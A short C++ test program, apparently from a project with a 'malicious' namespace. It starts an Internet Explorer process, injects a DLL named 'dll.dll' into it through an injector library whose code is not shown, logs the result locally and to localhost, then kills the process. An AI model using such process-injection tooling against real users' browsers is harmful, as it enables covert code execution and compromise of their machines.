#include <common/Log.hpp>
#include <malicious/InternetExplorer.hpp>
#include <malicious/Injector.hpp>
#include <system/Process.hpp>

int main(int argc, char * argv[])
{
	try
	{
        LOG.setHeader("TEST INJECTION");
        LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
		LOG.addObserver(new Common::LogToConsole);

        Malicious::InternetExplorer ie;
		int exitCode = EXIT_FAILURE;
        if(Malicious::inject(ie.getPid(), "dll.dll"))
        {
		    LOG << "Injection succeeded";
			exitCode = EXIT_SUCCESS;
        }
        else
        {
            LOG << "Injection failed";
			exitCode = EXIT_FAILURE;
        }
		ie.kill();
		return exitCode;
    }
    catch(std::exception& e)
    {
        LOG << "Exception standard : " + to_string(e.what());
    }
	catch(...)
	{
		LOG << "Erreur d'origine inconnue";
	}
	return EXIT_FAILURE;
}
